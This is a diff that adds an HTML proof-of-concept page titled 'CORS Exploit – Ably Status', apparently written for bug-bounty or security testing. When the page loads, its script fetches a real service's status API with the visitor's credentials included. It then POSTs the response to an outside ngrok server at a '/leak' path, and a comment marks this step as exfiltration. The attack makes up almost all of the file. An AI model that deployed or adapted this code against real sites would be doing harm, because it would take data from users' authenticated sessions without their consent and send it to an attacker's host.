@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit – Ably Status</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    textarea {
+      width: 100%;
+      height: 300px;
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🚨 Ably Status CORS PoC</h1>
+  <p>Fetching from <code>https://status.ably.com/api/v2/status.json</code> with credentials...</p>
+  <textarea id="output">Loading...</textarea>
+
+  <script>
+    window.onload = () => {
+      fetch("https://status.ably.com/api/v2/status.json", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        alert("✅ Response received!");
+        document.getElementById("output").value = data;
+
+        // Exfiltrate to your ngrok server
+        fetch("https://b2fb-152-58-179-137.ngrok-free.app/leak", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ leaked: data })
+        });
+      })
+      .catch(err => {
+        alert("❌ Error: " + err);
+        document.getElementById("output").value = "Error:\n" + err;
+      });
+    };
+  </script>
+</body>
+</html>
